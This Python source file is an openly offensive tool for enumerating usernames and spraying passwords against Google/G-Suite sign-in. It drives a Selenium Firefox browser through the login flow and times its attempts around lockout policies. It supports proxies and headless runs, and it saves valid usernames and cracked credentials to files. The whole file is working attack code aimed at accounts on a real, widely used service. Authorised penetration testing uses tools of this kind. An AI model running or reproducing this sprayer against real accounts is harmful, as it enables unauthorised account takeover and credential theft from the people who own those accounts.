#!/usr/bin/env python3
# MIT License
# 
# Copyright (c) 2022 Mayk
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

"""A basic username enumeration and password spraying tool aimed at
G-Suite's DOM based authentication."""

from sys import exit
from time import sleep
from argparse import ArgumentParser
from collections import OrderedDict

# Import selenium packages
from selenium.webdriver import Firefox, DesiredCapabilities
from selenium.common.exceptions import TimeoutException, WebDriverException
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.firefox_profile import FirefoxProfile

from webdriver_manager.firefox import GeckoDriverManager


# Maspping of element XPATH's in the authentication process
elements = {
    "username": {
        "type":     "XPATH",
        "value":    "//*[@id=\"identifierId\"]"
    },
    "password": {
        "type":     "NAME",
        "value":    "password"
    },
    "button_next": {
        "type":     "XPATH",
        "value":    ("/html/body/div[1]/div[1]/div[2]/div/div[2]/"
        "div/div/div[2]/div/div[2]/div/div[1]/div/div/button")
    }
}

# Colorized output during run
class text_colors:
    red = "\033[91m"
    green = "\033[92m"
    yellow = "\033[93m"
    reset = "\033[0m"


class BrowserEngine:

    options = Options()
    profile = FirefoxProfile()
    driver_path = GeckoDriverManager(log_level=0).install()
    # Set preferences at the class level
    options.set_preference("permissions.default.image", 2)  # Supposed to help with memory issues
    options.set_preference("dom.ipc.plugins.enabled.libflashplayer.so", False)
    options.set_preference("browser.cache.disk.enable", False)
    options.set_preference("browser.cache.memory.enable", False)
    options.set_preference("browser.cache.offline.enable", False)
    options.set_preference("network.http.use-cache", False)
    options.set_preference('intl.accept_languages', 'en-US')
    options.accept_untrusted_certs = True

    def __init__(self, wait=5, proxy=None, headless=False):
        self.options.headless = headless
        if headless:
            self.options.add_argument("--headless")
        if proxy is not None:
            print('here')
            self.set_proxy(proxy)
        self.options.profile = self.profile
        self.driver = Firefox(options=self.options, service=Service(self.driver_path))
        self.driver.set_window_position(0, 0)
        self.driver.set_window_size(1024, 768)
        self.wait = WebDriverWait(self.driver, wait)

    def set_proxy(self, proxy):
        if proxy is not None:
            ip, port = proxy.split(":")
            self.options.set_preference('network.proxy.type', 1)
            self.options.set_preference('network.proxy.http', ip)
            self.options.set_preference('network.proxy.http_port', int(port))
            #self.options.set_preference('network.proxy.https', ip)
            #self.options.set_preference('network.proxy.https_port', int(port))
            self.options.update_preferences()

    def quit(self):
        self.driver.quit()

    def close(self):
        self.driver.close()

    def refresh(self):
        self.driver.refresh()

    def back(self):
        self.driver.execute_script("window.history.go(-1)")

    def clear_cookies(self):
        self.driver.delete_all_cookies()

    def get(self, url):
        print(self.options)
        self.driver.get(url)

    def find_element(self, type_, value):
        try:
            return self.wait.until(
                lambda driver: driver.find_element(getattr(By, type_), value)
            )
        except TimeoutException:
            return False

    def populate_element(self, element, value, sendenter=False):
        if sendenter:
            element.send_keys(value + Keys.RETURN)
        else:
            element.send_keys(value)

    def is_clickable(self, type_, value):
        return self.wait.until(
            EC.element_to_be_clickable((getattr(By, type_), value))
        )

    def click(self, button):
        button.click()

    def select_dropdown(self, element, value):
        select = Select(element)
        select.select_by_value(value)

    def submit(self, form):
        form.submit()

    def execute_script(self, code):
        self.driver.execute_script(code)

    def screenshot(self, filename):
        self.driver.get_screenshot_as_file(filename)



# ==========
# Statistics
# ==========
def spray_stats(creds, locked, invalid):
    print("\n%s\n[*] Password Spraying Stats\n%s" % ("="*27, "="*27))   
    print("[*] Total Usernames Tested:  %d" % (len(creds) + len(locked) + invalid))
    print("[*] Valid Accounts:          %d" % len(creds))
    print("[*] Locked Accounts:         %d" % len(locked))
    print("[*] Invalid Usernames:       %d" % invalid)
    if len(creds) > 0:
        print("[+] Writing valid credentials to the file: valid_creds.txt...")
        with open("valid_creds.txt", 'w') as file_:
            for user in creds.keys():
                file_.write("%s\n" % ("%s:%s" % (user, creds[user])))

def enum_stats(valid, invalid):
    print("\n%s\n[*] Username Enumeration Stats\n%s" % ("="*30, "="*30))
    print("[*] Total Usernames Tested:  %d" % (len(valid) + invalid))
    print("[*] Valid Usernames:         %d" % len(valid))
    print("[*] Invalid Usernames:       %d" % invalid)
    if len(valid) > 0:
        print("[+] Writing valid usernames to the file: valid_users.txt...")
        with open("valid_users.txt", 'w') as file_:
            for user in valid:
                file_.write("%s\n" % user)


# =========================
# Data manipulation helpers
# =========================
def loop_dict(dict_):
    for key in dict_.keys():
        yield key

def get_list_from_file(file_):
    with open(file_, "r") as f:
        list_ = [line.strip() for line in f]
    return list_


# =========================
# Password spraying helpers
# =========================
def lockout_reset_wait(lockout):
    print("[*] Sleeping for %.1f minutes" % (lockout))
    sleep(lockout * 60)

def reset_browser(browser, wait, proxy, headless):
    browser.close()
    return BrowserEngine(wait=wait, proxy=proxy)


# Username enumeration
def enum(args, username_list):
    valid = []
    invalid = 0
    counter = 0
    browser = BrowserEngine(wait=args.wait, proxy=args.proxy,
            headless=args.headless)

    for username in username_list:

        counter += 1

        print("[*] Current username: %s" % username)

        # This seems to helps with memory issues...
        browser.clear_cookies()

        # Reload the page for each username
        retry = 0
        loaded = None
        while loaded is None:
            try:
                browser.get(args.target)
                loaded = True
            except BaseException as e:
                retry += 1
                if retry == 5:
                    print("[ERROR] %s" % e)
                    exit(1)
                pass

        # Populate the username field and click 'Next'
        element = elements["username"]
        usernamefield = browser.find_element(element["type"], element["value"])
        if not usernamefield:
            print("%s[Error] %s%s" % (text_colors.red, "Username field not found",
                    text_colors.reset))
        else:
            browser.populate_element(usernamefield, username)
        # Find button and click it
        element = elements["button_next"]
        try:
            browser.click(browser.is_clickable(element["type"], element["value"]))
        except BaseException as e:
            print("[ERROR] %s" % e)
            continue

        sleep(args.wait) # Ensure the previous DOM is stale

        # Handle invalid usernames
        element = elements["password"]
        if not browser.find_element(element["type"], element["value"]):
            if args.verbose:
                print("%s[Invalid User] %s%s" % (text_colors.red,
                    username, text_colors.reset))
            invalid += 1

        # If no username error, valid username
        else:
            print("%s[Found] %s%s" % (text_colors.green, username, text_colors.reset))
            valid.append(username)


        # Handle browser resets after every given username attempts
        if counter == args.reset_after:
            browser = reset_browser(browser, args.wait,
                    args.proxy, args.headless) # Reset the browser to deal with latency issues
            counter = 0

    browser.quit()
    enum_stats(valid, invalid)


# Password spray
def spray(args, username_list, password_list):
    creds = {}
    locked = []
    invalid = 0
    counter = 0
    last_index = len(password_list) - 1
    browser = BrowserEngine(wait=args.wait, proxy=args.proxy,
            headless=args.headless)

    for index, password in enumerate(password_list):

        print("[*] Spraying password: %s" % password)

        for username in username_list:

            print("[*] Current username: %s" % username)

            # This seems to helps with memory issues...
            browser.clear_cookies()

            # Reload the page for each username
            retry = 0
            loaded = None
            while loaded is None:
                try:
                    browser.get(args.target)
                    loaded = True
                except BaseException as e:
                    retry += 1
                    if retry == 5:
                        print("[ERROR] %s" % e)
                        exit(1)
                    pass

            # Populate the username field and click 'Next'
            element = elements["username"]
            usernamefield = browser.find_element(element["type"], element["value"])
            if not usernamefield:
                print("%s[Error] %s%s" % (text_colors.red, "Username field not found",
                    text_colors.reset))
            else:
                browser.populate_element(usernamefield, username)
            # Find button and click it
            element = elements["button_next"]
            try:
                browser.click(browser.is_clickable(element["type"], element["value"]))
            except BaseException as e:
                print("[ERROR] %s" % e)
                continue

            sleep(args.wait) # Ensure the previous DOM is stale

            # Handle invalid usernames
            element = elements["password"]
            pwdfield = browser.find_element(element["type"], element["value"])
            if not pwdfield:
                if args.verbose:
                    print("%s[Invalid User] %s%s" % (text_colors.red,
                        username, text_colors.reset))
                    # Remove from list
                    username_list.remove(username)
                invalid += 1 # Keep track so the user knows they need to run enum
                counter += 1

            else:
                # Populate the password field and click 'Sign In'
                browser.populate_element(pwdfield, password, True)
                #browser.click(browser.is_clickable(elements["type"], elements["button_next"]))

                sleep(args.wait) # Ensure the previous DOM is stale

                # TODO: Check if account is locked out
                #if browser.find_element(elements["type"], elements["locked"]):
                #    if args.verbose: print("%s[Account Locked] %s%s" % (text_colors.yellow, username, text_colors.reset))
                #    locked.append(username)
                #    break

                # Check for invalid password or account lock outs
                if not browser.find_element(element["type"], element["value"]):
                    print("%s[Found] %s:%s%s" % (text_colors.green, username, password, text_colors.reset))
                    creds[username] = password
                    # Remove user from list
                    username_list.remove(username)

                else:
                    print("%s[Invalid Creds] %s:%s%s" % (text_colors.red, username, password, text_colors.reset))

                counter += 1


            if counter >= args.reset_after:
                browser = reset_browser(browser, args.wait,
                        args.proxy, args.headless) # Reset the browser to deal with latency issues
                counter = 0

        # Wait for lockout period if not last password
        if index != last_index:
            lockout_reset_wait(args.lockout)

    browser.quit()
    spray_stats(creds, locked, invalid)



# Print the banner
def banner(args):
    BANNER = ("\n.d8888b.   .d8888b.  8888888b.  8888888b.         d8888 Y88b   d88P 8888888888 8888888b.  \n"
        "d88P  Y88b d88P  Y88b 888   Y88b 888   Y88b       d88888  Y88b d88P  888        888   Y88b \n"
        "888    888 Y88b.      888    888 888    888      d88P888   Y88o88P   888        888    888 \n"
        "888         \"Y888b.   888   d88P 888   d88P     d88P 888    Y888P    8888888    888   d88P \n"
        "888  88888     \"Y88b. 8888888P\"  8888888P\"     d88P  888     888     888        8888888P\"  \n"
        "888    888       \"888 888        888 T88b     d88P   888     888     888        888 T88b   \n"
        "Y88b  d88P Y88b  d88P 888        888  T88b   d8888888888     888     888        888  T88b  \n"
        " \"Y8888P88  \"Y8888P\"  888        888   T88b d88P     888     888     8888888888 888   T88b \n"
        "\n\n")


    _args = vars(args)
    for arg in _args:
        if _args[arg]:
            space = ' ' * (15 - len(arg))

            BANNER += "\n   > %s%s:  %s" % (arg, space, str(_args[arg]))

            # Add data meanings
            if arg == 'lockout':
                BANNER += " minutes"
            
            if arg == 'wait':
                BANNER += " seconds"

    BANNER += "\n"
    BANNER += "\n>----------------------------------------<\n"

    print(BANNER)



"""
G-Suite handles authentication uniquely.
Instead of username and password fields in a single form on one page, the DOM dynamically modifies
the page to accept a username, check if it is valid, and then accept a password.
"""
if __name__ == "__main__":
    parser = ArgumentParser(description="G-Suite Password Sprayer.")
    parser.add_argument("-t", "--target",   type=str, 
            help="Target URL (default: %(default)s)", default="https://accounts.google.com/")
    group_user = parser.add_mutually_exclusive_group(required=True)
    group_user.add_argument("-u", "--username", type=str,
            help="Single username")
    group_user.add_argument("-U", "--usernames", type=str, metavar="FILE",
            help="File containing usernames")
    parser.add_argument("-o", "--output", type=str,
            help="Output file (default depends on subcommand)", required=False)
    parser.add_argument("-r", "--reset-after", type=int,
            help="Reset browser after N attempts (default: %(default)s)", default=1,
            metavar="N", dest="reset_after")
    parser.add_argument("--headless", action="store_true",
            help="Run in headless mode", required=False),
    parser.add_argument("--proxy", type=str,
            help="Proxy to pass traffic through: <ip:port>", required=False)
    parser.add_argument("--wait", type=int,
            help="Time to wait (in seconds) when looking for DOM elements (default: %(default)s)",
            default=3, required=False)
    parser.add_argument("-v", "--verbose", action="store_true",
            help="Verbose output", required=False)

    subparsers = parser.add_subparsers(title="subcommands",
            description="valid subcommands", required=True,
            help="additional help", dest="cmd")
    
    # Add subparser for enumeration
    parser_enum = subparsers.add_parser("enum", 
            description="Perform user enumeration",
            help="Perform user enumeration")
    parser_enum.add_argument("-o", "--output", type=str, default="valid_users.txt",
            help="Output file (default: %(default)s)", required=False)

    # Add subparser for password spraying
    parser_spray = subparsers.add_parser("spray",
            description="Perform password spraying",
            help="Perform password spraying")
    parser_spray.add_argument("-o", "--output", type=str, default="valid_creds.txt",
            help="Output file (default: %(default)s)", required=False)
    group_password = parser_spray.add_mutually_exclusive_group(required=True)
    group_password.add_argument("-p", "--password", type=str,
            help="Single password")
    group_password.add_argument("-P", "--passwords", type=str,
            help="File containing passwords", metavar="FILE")
    parser_spray.add_argument("--lockout", type=float, required=True,
            help="Lockout policy reset time (in minutes) (required)")

    args = parser.parse_args()

    assert args.reset_after > 0
    if args.cmd == "spray":
        assert args.wait >= 0
        assert args.lockout >= 0


    # Print the banner
    banner(args)

    try:
        username_list = [args.username] if args.username else get_list_from_file(args.usernames)

        if args.cmd == "spray":
            password_list = [args.password] if args.password else get_list_from_file(args.passwords)
            spray(args, username_list, password_list)

        elif args.cmd == "enum":
            enum(args, username_list)

    except IOError as e:
        print(e)
        exit(1)
